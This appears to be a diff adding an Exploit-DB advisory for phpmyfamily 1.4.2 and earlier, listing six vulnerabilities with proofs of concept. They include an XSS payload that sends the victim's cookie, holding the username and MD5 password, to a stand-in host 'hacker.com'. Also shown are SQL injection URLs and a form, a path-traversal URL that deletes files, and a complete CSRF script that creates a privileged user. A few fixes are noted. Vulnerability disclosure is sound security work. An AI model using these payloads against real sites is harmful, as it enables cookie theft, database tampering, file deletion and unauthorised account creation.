@@ -1,0 +1,128 @@
+'''
+  __  __  ____         _    _ ____  
+ |  \/  |/ __ \   /\  | |  | |  _ \ 
+ | \  / | |  | | /  \ | |  | | |_) |
+ | |\/| | |  | |/ /\ \| |  | |  _ < 
+ | |  | | |__| / ____ \ |__| | |_) |
+ |_|  |_|\____/_/    \_\____/|____/ 
+
+http://www.exploit-db.com/moaub-17-phpmyfamily-multiple-remote-vulnerabilities/
+'''
+
+- Title  : phpmyfamily Multiple Remote Vulnerabilities.
+- Affected Version : phpmyfamily  <= 1.4.2
+- Vendor  Site   : http://www.phpmyfamily.net/
+- Discovery : Abysssec.com
+ 
+- Description :
+===============
+phpmyfamily is a dynamic genealogy website builder which allows geographically dispersed family members 
+to maintain a central database of research which is readily accessable and editable. By having a central repository, 
+family members can contribute as and when information becomes available without requiring them to send it to a central 'custodian', 
+or disseminate via email, and allows anecdotal information and possible leads to be shared.
+
+- Vulnerabilities:
+==================
+1)Information  Disclosure:
+--------------------------			
+	1-1)Directory listing:
+	+POC:
+		http://site.com/phpmyfamily/admin/
+		http://site.com/phpmyfamily/docs/
+		http://site.com/phpmyfamily/images/ 
+		http://site.com/phpmyfamily/inc/
+		http://site.com/phpmyfamily/lang/ 
+		http://site.com/phpmyfamily/styles/
+	+Fix:
+		Create index.html in all folders.
+		
+	1-2)Cookie Info:	
+		User's Cookie contions username and MD5 password.
+ 
+2)XSS:
+------
+	+Example Vulnerable Code:
+
+	inc/passwdform.inc.php[line41-42]
+				@$reason = $_REQUEST["reason"];
+				echo "<font color=\"red\">".$reason."</font>";
+	+POC:
+	This poc send victim's cookie(contions username and MD5 password) to attacker site.
+	http://SITE.com/phpmyfamily/inc/passwdform.inc.php?reason=<script>document.write("<img src='hacker.com/c.php?cookie="+document.cookie +"'/>")</script>
+	
+	+other poc:
+	a)census.php[line23-26]
+	http://SITE.com/phpmyfamily/census.php?ref=<script>document.write("<img src='hacker.com/c.php?cookie="+document.cookie +"'/>")</script>
+	b)mail.php[line 25-35]
+	http://SITE.com/phpmyfamily/mail.php?referer=<SCRIPT CODE>
+	c)track.php[line 23-26]
+	http://SITE.com/phpmyfamily/track.php?person=<SCRIPT CODE>
+	d)people.php[line ]
+	http://SITE.com/phpmyfamily/people.php?person=1>"><ScRiPt%20%0a%0d>alert(404385187829)%3B</ScRiPt>
+
+3)Path Disclosure:
+--------------------------------------
+	+POC: 
+		http://SITE.com/phpmyfamily/admin.php?func=ged
+		http://SITE.com/phpmyfamily/inc/gedcom.inc.php	
+
+4)SQL Injection:
+-------------
+	Code:
+	:my.php[line 32-33]
+		$query = "UPDATE ".$tblprefix."users SET email = '".$_POST["pwdEmail"]."' WHERE id = '".$_SESSION["id"]."'";
+		$result = mysql_query($query) or die(mysql_error());
+	+POC:
+		http://SITE.com/phpmyfamily/my.php?func=email&pwdEmail=bbb@aa.com',edit='Y'%00
+		<form method="post" action="my.php?func=email">
+		<input type="text" name="pwdEmail" value="bbb@aa.com',edit='Y';%00">
+		<input type="submit" value="send">
+		</form>
+	+Fix:
+		use function quote_smart:
+			$query = "UPDATE ".$tblprefix."users SET email = '".quote_smart($_POST["pwdEmail"])."' WHERE id = '".$_SESSION["id"]."'";
+	+other:
+		track.php[line 145-148]		http://SITE.com/phpmyfamily/track.php
+		passthru.php [line 221-220] http://SITE.com/phpmyfamily/passthru.php
+		and ...
+		
+5)Delete File:
+--------------
+CMS's users can delete each file by this Vulnerability.
+	+Code:	passthru.php line[218-219]
+		$docFile = "docs/".$_REQUEST["transcript"];
+		if (@unlink($docFile) || !file_exists($docFile)) 
+	+POC:
+		http://SITE.com/phpmyfamily/passthru.php?func=delete&area=transcript&person=00002&transcript=../../../file.ext
+	+Fix:
+		use function quote_smart:
+			$docFile = "docs/".quote_smart($_REQUEST["transcript"]);
+
+6)XSRF:
+-------
+		+POC:
+			<script>
+				function creat_request(path,parameter,method){
+				method = method || "post"; 
+				var remote_dive = document.createElement('div');
+  				remote_dive.id = 'Div_id';
+  				var style = 'border:0;width:0;height:0;';
+  				remote_dive.innerHTML = "<iframe name='iframename' id='iframeid' style='"+style+"'></iframe>";
+  				document.body.appendChild(remote_dive);
+   				var form = document.createElement("form");
+  				form.setAttribute("method", method);
+  				form.setAttribute("action", path);
+  				form.setAttribute("target", "iframename");
+	    		for(var key in parameter) 
+				{
+  				var hiddenField = document.createElement("input");
+  				hiddenField.setAttribute("type", "hidden");
+  				hiddenField.setAttribute("name", key);
+  				hiddenField.setAttribute("value", parameter[key]);
+  				      form.appendChild(hiddenField);
+    				}
+  				document.body.appendChild(form);  
+  				form.submit();
+				}    
+      		    creat_request('http://SITE.com/phpmyfamily/admin.php?func=add',{'pwdUser':'aaaa','pwdEmail':'aa%40sss.com','pwdPwd1':'123','pwdPwd2':'123','pwdEdit':'on','pwdRestricted':'1910-01-01','pwdStyle':'default','Create':'Submit+Query'});
+			</script>
